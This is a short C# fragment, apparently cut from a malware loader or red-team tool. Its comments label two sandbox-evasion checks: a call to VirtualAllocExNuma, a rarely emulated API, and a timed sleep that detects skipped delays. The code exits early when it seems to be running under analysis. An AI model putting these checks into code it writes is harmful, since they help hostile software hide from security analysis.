// Sandbox evasion using rare-emulated API to attempt heuristics/behaviour bypass
IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
if (mem == null)
{
    return;
}

// Sandbox evasion to test if sleep functions are removed
DateTime t1 = DateTime.Now;
Thread.Sleep(10000);
double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
if (deltaT < 9.5)
{
    return;
}